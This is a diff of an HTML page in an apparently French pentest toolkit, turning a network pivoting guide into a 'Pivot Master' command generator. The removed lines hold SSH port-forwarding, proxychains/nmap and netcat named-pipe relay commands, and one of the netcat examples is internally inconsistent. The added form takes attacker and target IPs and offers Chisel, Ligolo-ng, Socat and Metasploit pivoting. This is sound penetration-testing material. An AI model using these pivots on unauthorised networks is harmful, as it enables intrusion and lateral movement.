@@ -3,243 +3,33 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Guide de Pivotement Réseau</title>
-    <!-- Bootstrap CSS (Assurez-vous qu'il est chargé si vous utilisez des classes BS non couvertes par styles.css) -->
-    <link rel="stylesheet" href="https://stackpath.bootstrapcdn.com/bootstrap/4.5.2/css/bootstrap.min.css">
-    <!-- CSS Externe -->
+    <title>Pivot Master - Générateur de Commandes de Pivot</title>
     <link rel="stylesheet" href="/assets/css/styles.css">
-    <!-- Font Awesome -->
-    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.0.0/css/all.min.css">
-    <style>
-        /* Styles spécifiques pour cette page */
-        #placeholderForm .card-header {
-            font-size: 1.1em;
-            padding: 0.5rem 1rem;
-        }
-        #placeholderForm .form-group {
-            margin-bottom: 0.75rem;
-        }
-        #placeholderForm label {
-            font-size: 0.85em;
-            margin-bottom: 0.2rem;
-            color: var(--text-color-muted, #6c757d);
-            font-weight: 600;
-        }
-        #placeholderForm input[type="text"] {
-            font-size: 0.9em;
-            padding: 0.375rem 0.75rem;
-        }
-
-        /* Styles pour les onglets de techniques */
-        .technique-tabs {
-            border-bottom: 1px solid var(--border-color, #dee2e6);
-            margin-bottom: 1.5rem;
-        }
-        .technique-tabs .nav-link {
-            border: 1px solid transparent;
-            border-top-left-radius: .25rem;
-            border-top-right-radius: .25rem;
-            padding: 0.6rem 1rem;
-            font-size: 0.95em;
-            color: var(--text-color-muted, #6c757d);
-            cursor: pointer;
-            transition: background-color 0.2s ease, color 0.2s ease;
-        }
-        .technique-tabs .nav-link i {
-            margin-right: 6px;
-        }
-        .technique-tabs .nav-link:hover {
-            border-color: var(--border-color-light, #e9ecef) var(--border-color-light, #e9ecef) var(--border-color, #dee2e6);
-            background-color: var(--background-color-secondary, #f8f9fa);
-            color: var(--text-color, #343a40);
-        }
-        .technique-tabs .nav-link.active {
-            color: var(--primary-color, #007bff);
-            background-color: var(--card-bg, #fff);
-            border-color: var(--border-color, #dee2e6) var(--border-color, #dee2e6) var(--card-bg, #fff);
-            font-weight: 600;
-        }
-
-        .technique-section {
-            display: none; /* Caché par défaut */
-            padding: 20px;
-            border: 1px solid var(--border-color, #dee2e6);
-            border-top: none; /* La bordure est gérée par les onglets */
-            border-radius: 0 0 .25rem .25rem;
-            background-color: var(--card-bg, #fff);
-            margin-top: -1px; /* Pour coller à la bordure des onglets */
-        }
-        .technique-section.active {
-            display: block;
-        }
-        .technique-section h3 {
-            margin-top: 1.5rem;
-            margin-bottom: 0.75rem;
-            padding-bottom: 0.5rem;
-            border-bottom: 1px solid var(--border-color-light, #e9ecef);
-            color: var(--primary-color, #007bff);
-        }
-         .technique-section h3:first-of-type {
-             margin-top: 0; /* Pas de marge en haut pour le premier titre */
-         }
-        .technique-section h4 {
-            margin-top: 1rem;
-            margin-bottom: 0.5rem;
-            font-size: 1.1em;
-            color: var(--heading-color, #34495e);
-        }
-
-        .code-block-container {
-            position: relative;
-            margin-bottom: 1rem;
-        }
-        .code-block-container pre {
-            margin: 0;
-            background-color: var(--code-bg, #f1f1f1); /* Fond légèrement différent */
-            color: var(--code-text, #333);
-            padding: 15px;
-            padding-right: 55px; /* Espace pour bouton */
-            border-radius: 4px;
-            border: 1px solid var(--border-color-light, #e1e4e8);
-            overflow-x: auto;
-            font-family: monospace;
-            font-size: 0.9em;
-            white-space: pre-wrap;
-            word-wrap: break-word;
-        }
-        .code-block-container .copy-btn {
-            position: absolute;
-            top: 8px;
-            right: 8px;
-            background-color: rgba(0, 0, 0, 0.1);
-            color: var(--text-color-muted, #6c757d);
-            border: 1px solid rgba(0, 0, 0, 0.15);
-            border-radius: 3px;
-            padding: 4px 9px;
-            font-size: 13px;
-            cursor: pointer;
-            opacity: 0.7;
-            transition: all 0.2s;
-        }
-        .code-block-container:hover .copy-btn {
-            opacity: 1;
-            background-color: rgba(0, 0, 0, 0.15);
-        }
-        .code-block-container .copy-btn:hover {
-             color: var(--text-color, #343a40);
-             background-color: rgba(0, 0, 0, 0.2);
-        }
-        .code-block-container .copy-btn.copied {
-            background-color: var(--success-color, #28a745);
-            color: white;
-            border-color: var(--success-color, #28a745);
-        }
-        .technique-section p code { /* Style pour code inline */
-             background-color: var(--inline-code-bg, #e9ecef);
-             padding: 0.2em 0.4em;
-             margin: 0;
-             font-size: 85%;
-             border-radius: 3px;
-             font-family: monospace;
-        }
-
-        /* Styles Dark Theme spécifiques */
-        body.dark-theme #placeholderForm label {
-            color: var(--dark-text-color-muted, #adb5bd);
-        }
-        body.dark-theme .technique-tabs {
-            border-bottom-color: var(--dark-border-color, #40444b);
-        }
-        body.dark-theme .technique-tabs .nav-link {
-            color: var(--dark-text-color-muted, #adb5bd);
-        }
-        body.dark-theme .technique-tabs .nav-link:hover {
-            border-color: var(--dark-border-color-light, #5a6268) var(--dark-border-color-light, #5a6268) var(--dark-border-color, #40444b);
-            background-color: var(--dark-background-color-hover-light, #3a3d40);
-            color: var(--dark-text-color, #e0e0e0);
-        }
-        body.dark-theme .technique-tabs .nav-link.active {
-            color: var(--dark-primary-color-light, #58a6ff);
-            background-color: var(--dark-card-bg, #2c2f33);
-            border-color: var(--dark-border-color, #40444b) var(--dark-border-color, #40444b) var(--dark-card-bg, #2c2f33);
-        }
-        body.dark-theme .technique-section {
-            background-color: var(--dark-card-bg, #2c2f33);
-            border-color: var(--dark-border-color, #40444b);
-        }
-         body.dark-theme .technique-section h3 {
-            border-bottom-color: var(--dark-border-color-light, #5a6268);
-            color: var(--dark-primary-color-light, #58a6ff);
-        }
-         body.dark-theme .technique-section h4 {
-             color: var(--dark-heading-color, #ffffff);
-         }
-        body.dark-theme .code-block-container pre {
-            background-color: var(--dark-code-bg, #282c34);
-            color: var(--dark-code-text, #abb2bf);
-            border-color: var(--dark-border-color-light, #5a6268);
-        }
-        body.dark-theme .code-block-container .copy-btn {
-            background-color: rgba(255, 255, 255, 0.1);
-            color: var(--dark-text-color-muted, #adb5bd);
-            border-color: rgba(255, 255, 255, 0.15);
-        }
-        body.dark-theme .code-block-container:hover .copy-btn {
-            background-color: rgba(255, 255, 255, 0.15);
-        }
-         body.dark-theme .code-block-container .copy-btn:hover {
-             color: var(--dark-text-color, #e0e0e0);
-             background-color: rgba(255, 255, 255, 0.2);
-         }
-        body.dark-theme .code-block-container .copy-btn.copied {
-            background-color: var(--dark-success-color, #198754);
-            border-color: var(--dark-success-color, #198754);
-            color: #fff;
-        }
-         body.dark-theme .technique-section p code {
-             background-color: var(--dark-inline-code-bg, #3a3d40);
-             color: var(--dark-inline-code-text, #ced4da);
-             border: 1px solid var(--dark-border-color, #40444b);
-         }
-
-        /* Cacher par défaut les groupes de paramètres */
-        #placeholderForm .form-group {
-            display: none;
-            /* Ajouter une petite transition pour la fluidité */
-            transition: opacity 0.3s ease-in-out;
-            opacity: 0; /* Commencer invisible pour la transition */
-        }
-
-        /* Style pour afficher un groupe (sera géré par JS) */
-        #placeholderForm .form-group.visible {
-            display: block;
-            opacity: 1;
-        }
-    </style>
+    <link rel="stylesheet" href="/assets/css/pivot-master.css">
+    <!-- Vis.js pour la visualisation réseau -->
+    <script src="https://unpkg.com/vis-network/standalone/umd/vis-network.min.js"></script>
 </head>
-<body class=""> <!-- La classe dark-theme sera gérée par theme.js -->
-
-    <!-- Bouton Sidebar Toggle -->
+<body>
+    <!-- Bouton pour afficher/masquer la sidebar -->
     <button id="sidebar-toggle" class="sidebar-toggle">
         <i>☰</i>
     </button>
 
-    <!-- Sidebar (Identique à hostmanager.html + lien Guide Pivotement) -->
+    <!-- Sidebar -->
     <div id="sidebar" class="sidebar">
         <a href="/index.html" class="sidebar-header">
             <h2>Pentest Tools</h2>
             <p>Suite d'outils pour pentest</p>
         </a>
+        
         <div class="sidebar-content">
             <ul class="sidebar-nav">
-                <!-- Catégories et liens existants -->
                 <div class="sidebar-category">Générateur</div>
                 <li class="sidebar-nav-item">
                     <a href="/pages/hostmanager.html" class="sidebar-nav-link">
                         <i>🖥️</i> Host Manager
                     </a>
-                   
-                <!-- Fin Nouvelle Section -->
+                </li>
                 <div class="sidebar-category">Outils</div>
                 <li class="sidebar-nav-item">
                     <a href="/pages/tools.html" class="sidebar-nav-link">
@@ -247,13 +37,13 @@
                     </a>
                 </li>
                 <li class="sidebar-nav-item">
-                    <a href="/pages/file_transfer.html" class="sidebar-nav-link active">
-                        <i>🔄</i> Transfert Fichiers <!-- Emoji mis à jour -->
+                    <a href="/pages/file_transfer.html" class="sidebar-nav-link">
+                        <i>🔄</i> Transfert Fichiers
                     </a>
                 </li>
                 <li class="sidebar-nav-item">
                     <a href="/pages/pivoting_guide.html" class="sidebar-nav-link active">
-                        <i>🔀</i> Pivoting Guide <!-- Emoji mis à jour -->
+                        <i>🔀</i> Pivot Master
                     </a>
                 </li>
              <li class="sidebar-nav-item">
@@ -261,10 +51,11 @@
                     <i>🔑</i> Guide Privesc
                 </a>
             </li>
+                
                 <div class="sidebar-category">Parsers</div>
                 <li class="sidebar-nav-item">
                     <a href="/pages/hostsmaker.html" class="sidebar-nav-link">
-                        <i>🌐</i> /etc/hosts Maker
+                        <i>⚙️</i> Config Generator
                     </a>
                 </li>
                 <li class="sidebar-nav-item">
@@ -284,9 +75,8 @@
     <!-- Header -->
     <header id="main-header" class="main-header">
         <div class="header-container">
-            <h1>Guide de Pivotement Réseau</h1>
+            <h1>🔀 Pivot Master - Générateur de Commandes</h1>
             <div class="header-controls">
-                <!-- Sélecteur de langue -->
                 <div class="language-selector">
                     <button id="languageDropdown" class="language-dropdown">
                         <i class="icon-language">🌍</i>
@@ -302,7 +92,6 @@
                         </div>
                     </div>
                 </div>
-                <!-- Bouton Thème -->
                 <button id="toggleTheme" class="theme-toggle">
                     <i class="icon-theme">🌓</i>
                 </button>
@@ -310,377 +99,386 @@
         </div>
     </header>
 
-    <!-- Contenu Principal -->
+    <!-- Contenu principal -->
     <div id="main-content" class="main-content">
 
-        <!-- ================================== -->
-        <!-- == SECTION PARAMETRES DYNAMIQUES == -->
-        <!-- ================================== -->
-        <div class="card shadow-sm mb-4">
-            <div class="card-header">
-                <i class="fas fa-sliders-h"></i> Paramètres Dynamiques (Contextuels)
+        <!-- Header de l'outil -->
+        <div class="pivot-header">
+            <h2>🔀 Pivot Command Generator</h2>
+            <p>Saisissez vos informations et obtenez des commandes de pivot prêtes à l'emploi</p>
+        </div>
+
+        <!-- Configuration principale -->
+        <div class="pivot-container">
+            
+            <!-- Section Configuration -->
+            <div class="config-section">
+                <div class="section-card">
+                    <h3>⚙️ Configuration</h3>
+                    
+                    <!-- Informations attaquant -->
+                    <div class="config-group">
+                        <h4>🖥️ Machine Attaquante</h4>
+                        <div class="form-row">
+                            <div class="form-group">
+                                <label for="attackerIP">IP Attaquant :</label>
+                                <input type="text" id="attackerIP" value="10.10.14.15" placeholder="10.10.14.15">
+                            </div>
+                            <div class="form-group">
+                                <label for="attackerPort">Port d'écoute :</label>
+                                <input type="number" id="attackerPort" value="4444" placeholder="4444">
+                            </div>
+                        </div>
+                    </div>
+
+                    <!-- Informations première target -->
+                    <div class="config-group">
+                        <h4>🎯 Target 1 (Point d'entrée)</h4>
+                        <div class="form-row">
+                            <div class="form-group">
+                                <label for="target1IP">IP Target 1 :</label>
+                                <input type="text" id="target1IP" placeholder="192.168.1.100">
+                            </div>
+                            <div class="form-group">
+                                <label for="target1User">Utilisateur :</label>
+                                <input type="text" id="target1User" placeholder="www-data">
             </div>
-            <div class="card-body">
-                <form id="placeholderForm" class="row">
-                    <!-- Colonne 1 -->
-                    <div class="col-md-6">
-                        <div class="form-group" data-techniques="ssh,netcat,chisel,ligolo,sshuttle">
-                            <label for="yourIp">Votre IP (Attaquant)</label>
-                            <input type="text" class="form-control form-control-sm" id="yourIp" data-placeholder="<VOTRE_IP>" placeholder="10.10.14.5">
                         </div>
-                        <div class="form-group" data-techniques="ssh,netcat,sshuttle">
-                            <label for="intermediateIp">IP Cible Intermédiaire</label>
-                            <input type="text" class="form-control form-control-sm" id="intermediateIp" data-placeholder="<CIBLE_INTERMEDIAIRE_IP>" placeholder="192.168.1.100">
+                        <div class="form-row">
+                            <div class="form-group">
+                                <label for="target1OS">OS :</label>
+                                <select id="target1OS">
+                                    <option value="linux">Linux</option>
+                                    <option value="windows">Windows</option>
+                                </select>
+                            </div>
+                            <div class="form-group">
+                                <label for="target1Services">Services ouverts :</label>
+                                <input type="text" id="target1Services" placeholder="22,80,443">
+                            </div>
                         </div>
-                         <div class="form-group" data-techniques="ssh,sshuttle">
-                            <label for="username">Username (Accès Intermédiaire)</label>
-                            <input type="text" class="form-control form-control-sm" id="username" data-placeholder="<USERNAME>" placeholder="user">
+                    </div>
+
+                    <!-- Informations seconde target -->
+                    <div class="config-group">
+                        <h4>🎯 Target 2 (Destination finale)</h4>
+                        <div class="form-row">
+                            <div class="form-group">
+                                <label for="target2IP">IP Target 2 :</label>
+                                <input type="text" id="target2IP" placeholder="10.10.10.50">
+                            </div>
+                            <div class="form-group">
+                                <label for="target2Port">Port cible :</label>
+                                <input type="number" id="target2Port" value="22" placeholder="22">
+                            </div>
                         </div>
-                        <div class="form-group" data-techniques="ssh">
-                             <label for="password">Password (Optionnel, pour SSH)</label>
-                             <input type="text" class="form-control form-control-sm" id="password" data-placeholder="<PASSWORD>" placeholder="password123">
+                        <div class="form-row">
+                            <div class="form-group">
+                                <label for="target2OS">OS :</label>
+                                <select id="target2OS">
+                                    <option value="linux">Linux</option>
+                                    <option value="windows">Windows</option>
+                                </select>
+                            </div>
+                            <div class="form-group">
+                                <label>
+                                    <input type="checkbox" id="doublePivot"> Double Pivot (Target 3)
+                                </label>
                          </div>
-                         <div class="form-group" data-techniques="ssh,netcat,chisel">
-                            <label for="internalServiceIp">IP/Nom Service Interne</label>
-                            <input type="text" class="form-control form-control-sm" id="internalServiceIp" data-placeholder="<IP_SERVICE_INTERNE>" placeholder="192.168.100.50">
-                        </div>
-                        <div class="form-group" data-techniques="ssh,netcat,chisel">
-                            <label for="internalServicePort">Port Service Interne</label>
-                            <input type="text" class="form-control form-control-sm" id="internalServicePort" data-placeholder="<PORT_SERVICE_INTERNE>" placeholder="80">
                         </div>
                     </div>
-                    <!-- Colonne 2 -->
-                    <div class="col-md-6">
-                        <div class="form-group" data-techniques="ssh,chisel">
-                            <label for="localPort">Port Local (Forwarding/SOCKS)</label>
-                            <input type="text" class="form-control form-control-sm" id="localPort" data-placeholder="<PORT_LOCAL>" placeholder="8080">
-                        </div>
-                        <div class="form-group" data-techniques="netcat">
-                            <label for="attackerPort">Port Attaquant (Relay Netcat)</label>
-                            <input type="text" class="form-control form-control-sm" id="attackerPort" data-placeholder="<PORT_ATTAQUANT>" placeholder="4444">
-                        </div>
-                        <div class="form-group" data-techniques="netcat">
-                            <label for="targetPort">Port Cible (Relay Netcat)</label>
-                            <input type="text" class="form-control form-control-sm" id="targetPort" data-placeholder="<PORT_CIBLE>" placeholder="5555">
-                        </div>
-                         <div class="form-group" data-techniques="chisel">
-                            <label for="chiselPort">Port Chisel (Serveur)</label>
-                            <input type="text" class="form-control form-control-sm" id="chiselPort" data-placeholder="<PORT_CHISEL>" placeholder="8000">
-                        </div>
-                        <div class="form-group" data-techniques="ligolo">
-                            <label for="ligoloPort">Port Ligolo (Proxy)</label>
-                            <input type="text" class="form-control form-control-sm" id="ligoloPort" data-placeholder="<PORT_LIGOLO>" placeholder="11601">
-                        </div>
-                        <div class="form-group" data-techniques="sshuttle,ligolo">
-                            <label for="internalNetworkCidr">Sous-Réseau Interne (CIDR)</label>
-                            <input type="text" class="form-control form-control-sm" id="internalNetworkCidr" data-placeholder="<RESEAU_INTERNE_CIDR>" placeholder="192.168.100.0/24">
+
+                    <!-- Target 3 pour double pivot -->
+                    <div class="config-group" id="target3Group" style="display: none;">
+                        <h4>🎯 Target 3 (Double Pivot)</h4>
+                        <div class="form-row">
+                            <div class="form-group">
+                                <label for="target3IP">IP Target 3 :</label>
+                                <input type="text" id="target3IP" placeholder="172.16.1.50">
+                            </div>
+                            <div class="form-group">
+                                <label for="target3Port">Port cible :</label>
+                                <input type="number" id="target3Port" value="3389" placeholder="3389">
+                            </div>
                         </div>
                     </div>
-                </form>
-                 <small class="form-text text-muted mt-2">
-                    <i class="fas fa-info-circle"></i> Seuls les paramètres pertinents pour la technique sélectionnée sont affichés. Les valeurs sont sauvegardées localement.
-                 </small>
+
+                    <!-- Boutons d'action -->
+                    <div class="action-buttons">
+                        <button class="btn btn-primary" onclick="generateCommands()">⚡ Générer les Commandes</button>
+                        <button class="btn btn-secondary" onclick="clearForm()">🗑️ Effacer</button>
+                        <button class="btn btn-info" onclick="loadExample()">💡 Exemple</button>
+                    </div>
+                </div>
+            </div>
+
+            <!-- Section Techniques -->
+            <div class="techniques-section">
+                <div class="section-card">
+                    <h3>🛠️ Techniques de Pivot</h3>
+                    
+                    <div class="techniques-grid">
+                        <!-- SSH Tunneling -->
+                        <div class="technique-card" data-technique="ssh">
+                            <div class="technique-header">
+                                <input type="checkbox" id="tech-ssh" checked>
+                                <label for="tech-ssh">🔐 SSH Tunneling</label>
+                            </div>
+                            <div class="technique-desc">
+                                Tunnels SSH dynamiques et locaux
+                            </div>
+                        </div>
+
+                        <!-- Chisel -->
+                        <div class="technique-card" data-technique="chisel">
+                            <div class="technique-header">
+                                <input type="checkbox" id="tech-chisel" checked>
+                                <label for="tech-chisel">⚡ Chisel</label>
+                            </div>
+                            <div class="technique-desc">
+                                Tunnels HTTP/HTTPS rapides
+                            </div>
+                        </div>
+
+                        <!-- Ligolo -->
+                        <div class="technique-card" data-technique="ligolo">
+                            <div class="technique-header">
+                                <input type="checkbox" id="tech-ligolo">
+                                <label for="tech-ligolo">🌐 Ligolo-ng</label>
+                            </div>
+                            <div class="technique-desc">
+                                Tunneling avancé avec interface réseau
+                            </div>
+                        </div>
+
+                        <!-- Socat -->
+                        <div class="technique-card" data-technique="socat">
+                            <div class="technique-header">
+                                <input type="checkbox" id="tech-socat">
+                                <label for="tech-socat">🔗 Socat</label>
+                            </div>
+                            <div class="technique-desc">
+                                Relais de connexions flexibles
+                            </div>
+                        </div>
+
+                        <!-- Netcat -->
+                        <div class="technique-card" data-technique="netcat">
+                            <div class="technique-header">
+                                <input type="checkbox" id="tech-netcat">
+                                <label for="tech-netcat">🐱 Netcat</label>
+                            </div>
+                            <div class="technique-desc">
+                                Relais simple et portable
+                            </div>
+                        </div>
+
+                        <!-- Metasploit -->
+                        <div class="technique-card" data-technique="metasploit">
+                            <div class="technique-header">
+                                <input type="checkbox" id="tech-metasploit">
+                                <label for="tech-metasploit">🔴 Metasploit</label>
+                            </div>
+                            <div class="technique-desc">
+                                Pivoting avec Meterpreter
+                            </div>
+                        </div>
+                    </div>
+                </div>
             </div>
         </div>
-        <!-- ================================== -->
-        <!-- == FIN SECTION PARAMETRES       == -->
-        <!-- ================================== -->
 
-        <!-- Onglets de Navigation des Techniques -->
-        <ul class="nav nav-tabs technique-tabs" id="techniqueTab" role="tablist">
-            <li class="nav-item" role="presentation">
-                <a class="nav-link active" id="ssh-tab" data-toggle="tab" href="#sshContent" role="tab" aria-controls="sshContent" aria-selected="true" data-technique="ssh">
-                    <i class="fab fa-ssh"></i> SSH
-                </a>
-            </li>
-            <li class="nav-item" role="presentation">
-                <a class="nav-link" id="netcat-tab" data-toggle="tab" href="#netcatContent" role="tab" aria-controls="netcatContent" aria-selected="false" data-technique="netcat">
-                    <i class="fas fa-cat"></i> Netcat
-                </a>
-            </li>
-            <li class="nav-item" role="presentation">
-                <a class="nav-link" id="chisel-tab" data-toggle="tab" href="#chiselContent" role="tab" aria-controls="chiselContent" aria-selected="false" data-technique="chisel">
-                    <i class="fas fa-chisel"></i> Chisel
-                </a>
-            </li>
-            <li class="nav-item" role="presentation">
-                <a class="nav-link" id="ligolo-tab" data-toggle="tab" href="#ligoloContent" role="tab" aria-controls="ligoloContent" aria-selected="false" data-technique="ligolo">
-                    <i class="fas fa-bolt"></i> Ligolo-ng
-                </a>
-            </li>
-            <li class="nav-item" role="presentation">
-                <a class="nav-link" id="sshuttle-tab" data-toggle="tab" href="#sshuttleContent" role="tab" aria-controls="sshuttleContent" aria-selected="false" data-technique="sshuttle">
-                    <i class="fas fa-space-shuttle"></i> SSHuttle
-                </a>
-            </li>
-        </ul>
-
-        <!-- Contenu des Onglets -->
-        <div class="tab-content" id="techniqueTabContent">
-
-            <!-- Section SSH -->
-            <div class="tab-pane fade show active technique-section" id="sshContent" role="tabpanel" aria-labelledby="ssh-tab" data-technique="ssh">
-                <h2><i class="fab fa-ssh"></i> Pivotement avec SSH</h2>
-                <p>SSH (Secure Shell) est un protocole réseau cryptographique permettant d'opérer des services réseau de manière sécurisée sur un réseau non sécurisé. Il est très utile pour le pivotement grâce à ses capacités de tunneling.</p>
-
-                <h3>Local Port Forwarding</h3>
-                <p>Permet d'accéder à un service sur un réseau interne (<code>&lt;IP_SERVICE_INTERNE&gt;:&lt;PORT_SERVICE_INTERNE&gt;</code>) via un port local (<code>&lt;PORT_LOCAL&gt;</code>) sur votre machine, en passant par la machine intermédiaire (<code>&lt;CIBLE_INTERMEDIAIRE_IP&gt;</code>).</p>
-                <h4>Commande</h4>
-                <div class="code-block-container">
-                    <pre><code class="language-bash" data-command-template="ssh -L <PORT_LOCAL>:<IP_SERVICE_INTERNE>:<PORT_SERVICE_INTERNE> <USERNAME>@<CIBLE_INTERMEDIAIRE_IP>">ssh -L &lt;PORT_LOCAL&gt;:&lt;IP_SERVICE_INTERNE&gt;:&lt;PORT_SERVICE_INTERNE&gt; &lt;USERNAME&gt;@&lt;CIBLE_INTERMEDIAIRE_IP&gt;</code></pre>
-                    <button class="copy-btn" title="Copier la commande"><i class="fa fa-copy"></i></button>
+        <!-- Section de visualisation réseau -->
+        <div class="network-visualization-section">
+            <div class="section-card">
+                <div class="network-header">
+                    <h3>🗺️ Topologie Réseau Interactive</h3>
+                    <div class="network-actions">
+                        <button class="btn btn-sm btn-secondary" onclick="resetNetworkView()">🔄 Reset Vue</button>
+                        <button class="btn btn-sm btn-info" onclick="fitNetworkView()">📐 Ajuster</button>
+                        <button class="btn btn-sm btn-success" onclick="exportNetworkImage()">📸 Export Image</button>
+                        <button class="btn btn-sm btn-warning" onclick="toggleNetworkPhysics()">⚡ Physique</button>
+                    </div>
                 </div>
-                <h4>Exemple Concret</h4>
-                <p>Accéder au service web sur <code>192.168.100.50:80</code> via votre port local <code>8080</code>, en utilisant le compte <code>user</code> sur <code>192.168.1.100</code> :</p>
-                <pre><code>ssh -L 8080:192.168.100.50:80 user@192.168.1.100</code></pre>
-                <p>Ensuite, ouvrez <code>http://127.0.0.1:8080</code> dans votre navigateur.</p>
-
-                <h3>Dynamic Port Forwarding (SOCKS Proxy)</h3>
-                <p>Crée un proxy SOCKS sur votre port local (<code>&lt;PORT_LOCAL&gt;</code>) qui relaie tout le trafic TCP via la machine intermédiaire (<code>&lt;CIBLE_INTERMEDIAIRE_IP&gt;</code>). Utile pour utiliser des outils comme Nmap ou Burp à travers le pivot.</p>
-                <h4>Commande</h4>
-                 <div class="code-block-container">
-                    <pre><code class="language-bash" data-command-template="ssh -D <PORT_LOCAL> <USERNAME>@<CIBLE_INTERMEDIAIRE_IP>">ssh -D &lt;PORT_LOCAL&gt; &lt;USERNAME&gt;@&lt;CIBLE_INTERMEDIAIRE_IP&gt;</code></pre>
-                    <button class="copy-btn" title="Copier la commande"><i class="fa fa-copy"></i></button>
-                </div>
-                <h4>Configuration ProxyChains</h4>
-                <p>Modifiez <code>/etc/proxychains4.conf</code> (ou similaire) pour ajouter :</p>
-                <pre><code>[ProxyList]
-socks5 127.0.0.1 &lt;PORT_LOCAL&gt;</code></pre>
-                 <p>Remplacez <code>&lt;PORT_LOCAL&gt;</code> par le port utilisé dans la commande <code>ssh -D</code> (ex: 1080).</p>
-                <h4>Utilisation</h4>
-                <p>Préfixez vos commandes avec <code>proxychains</code> :</p>
-                <pre><code>proxychains nmap -sT -p 80,445 &lt;IP_SERVICE_INTERNE&gt;
-proxychains curl http://&lt;IP_SERVICE_INTERNE&gt;</code></pre>
-                <h4>Exemple Concret</h4>
-                <p>Créer un proxy SOCKS sur le port local <code>1080</code> via <code>user@192.168.1.100</code> :</p>
-                <pre><code>ssh -D 1080 user@192.168.1.100</code></pre>
-                <p>Après configuration de ProxyChains (avec port 1080), lancez :</p>
-                <pre><code>proxychains nmap -sT -p 80,445 192.168.100.50</code></pre>
+                
+                <div class="network-container">
+                    <!-- Zone de visualisation -->
+                    <div class="network-canvas" id="networkCanvas">
+                        <!-- Vis.js network sera injecté ici -->
             </div>
 
-            <!-- Section Netcat -->
-            <div class="tab-pane fade technique-section" id="netcatContent" role="tabpanel" aria-labelledby="netcat-tab" data-technique="netcat">
-                 <h2><i class="fas fa-cat"></i> Pivotement avec Netcat</h2>
-                <p>Netcat est un utilitaire réseau polyvalent. Pour le pivotement, il est souvent utilisé pour des relais simples ou des reverse shells multi-sauts, mais il est moins fiable et non sécurisé comparé à SSH ou Chisel.</p>
-
-                <h3>Port Forwarding (Relay Simple)</h3>
-                <p>Relayer une connexion TCP d'un port sur la machine intermédiaire (<code>&lt;PORT_CIBLE&gt;</code>) vers un service interne (<code>&lt;IP_SERVICE_INTERNE&gt;:&lt;PORT_SERVICE_INTERNE&gt;</code>).</p>
-
-                <h4>Sur la Cible Intermédiaire (<code>&lt;CIBLE_INTERMEDIAIRE_IP&gt;</code>)</h4>
-                 <p>Méthode 1 (avec pipe nommé) :</p>
-                <div class="code-block-container">
-                    <pre><code class="language-bash" data-command-template="mkfifo /tmp/pipe; nc -lvp <PORT_CIBLE> 0&lt;/tmp/pipe | nc <IP_SERVICE_INTERNE> <PORT_SERVICE_INTERNE> 1&gt;/tmp/pipe; rm /tmp/pipe">mkfifo /tmp/pipe; nc -lvp &lt;PORT_CIBLE&gt; 0&lt;/tmp/pipe | nc &lt;IP_SERVICE_INTERNE&gt; &lt;PORT_SERVICE_INTERNE&gt; 1&gt;/tmp/pipe; rm /tmp/pipe</code></pre>
-                    <button class="copy-btn" title="Copier la commande"><i class="fa fa-copy"></i></button>
+                    <!-- Panneau d'informations -->
+                    <div class="network-info-panel" id="networkInfoPanel">
+                        <div class="info-header">
+                            <h4>📊 Informations Réseau</h4>
+                        </div>
+                        <div class="info-content" id="networkInfoContent">
+                            <div class="info-placeholder">
+                                <i>🖱️</i>
+                                <p>Cliquez sur un nœud pour voir les détails</p>
+                            </div>
+                        </div>
                 </div>
-                 <p>Méthode 2 (option <code>-c</code> ou <code>-e</code>, si disponible) :</p>
-                 <div class="code-block-container">
-                    <pre><code class="language-bash" data-command-template="nc -lvp <PORT_CIBLE> -c &quot;nc <IP_SERVICE_INTERNE> <PORT_SERVICE_INTERNE>&quot;">nc -lvp &lt;PORT_CIBLE&gt; -c "nc &lt;IP_SERVICE_INTERNE&gt; &lt;PORT_SERVICE_INTERNE&gt;"</code></pre>
-                    <button class="copy-btn" title="Copier la commande"><i class="fa fa-copy"></i></button>
                 </div>
 
-                <h4>Sur votre Machine (Attaquant)</h4>
-                <p>Connectez-vous au port d'écoute sur la cible intermédiaire :</p>
-                 <div class="code-block-container">
-                    <pre><code class="language-bash" data-command-template="nc <CIBLE_INTERMEDIAIRE_IP> <PORT_CIBLE>">nc &lt;CIBLE_INTERMEDIAIRE_IP&gt; &lt;PORT_CIBLE&gt;</code></pre>
-                    <button class="copy-btn" title="Copier la commande"><i class="fa fa-copy"></i></button>
+                <!-- Légende et contrôles -->
+                <div class="network-legend-panel">
+                    <div class="legend-section">
+                        <h4>📋 Légende</h4>
+                        <div class="legend-grid">
+                            <div class="legend-item">
+                                <div class="legend-node attacker"></div>
+                                <span>🔥 Attaquant</span>
+                            </div>
+                            <div class="legend-item">
+                                <div class="legend-node linux"></div>
+                                <span>🐧 Linux</span>
+                            </div>
+                            <div class="legend-item">
+                                <div class="legend-node windows"></div>
+                                <span>🪟 Windows</span>
+                            </div>
+                            <div class="legend-item">
+                                <div class="legend-node unknown"></div>
+                                <span>❓ Inconnu</span>
+                            </div>
+                        </div>
+                    </div>
+                    
+                    <div class="legend-section">
+                        <h4>🔗 Connexions</h4>
+                        <div class="legend-grid">
+                            <div class="legend-item">
+                                <div class="legend-edge direct"></div>
+                                <span>Direct</span>
+                            </div>
+                            <div class="legend-item">
+                                <div class="legend-edge pivot"></div>
+                                <span>Pivot</span>
+                            </div>
+                            <div class="legend-item">
+                                <div class="legend-edge tunnel"></div>
+                                <span>Tunnel</span>
+                            </div>
+                        </div>
+                    </div>
+                    
+                    <div class="legend-section">
+                        <h4>⚙️ Options</h4>
+                        <div class="network-options">
+                            <label>
+                                <input type="checkbox" id="showLabels" checked> Afficher labels
+                            </label>
+                            <label>
+                                <input type="checkbox" id="showEdgeLabels"> Labels connexions
+                            </label>
+                            <label>
+                                <input type="checkbox" id="hierarchicalLayout"> Layout hiérarchique
+                            </label>
+                            <label>
+                                <input type="checkbox" id="smoothEdges" checked> Edges lisses
+                            </label>
+                        </div>
+                    </div>
                 </div>
-                <h4>Exemple Concret</h4>
-                <p>Relayer le port 80 de <code>192.168.100.50</code> via le port <code>5555</code> de <code>192.168.1.100</code> :<br>
-                   Cible Intermédiaire: <code>mkfifo /tmp/p; nc -lvp 5555 0&lt;/tmp/p | nc 192.168.1.100 5555 1&gt;/tmp/p; rm /tmp/p</code><br>
-                   Attaquant: <code>nc 192.168.1.100 5555</code> (puis envoyez une requête HTTP, ex: <code>GET / HTTP/1.1</code> + Entrée deux fois)
-                </p>
-
-                <h3>Reverse Shell via Pivot</h3>
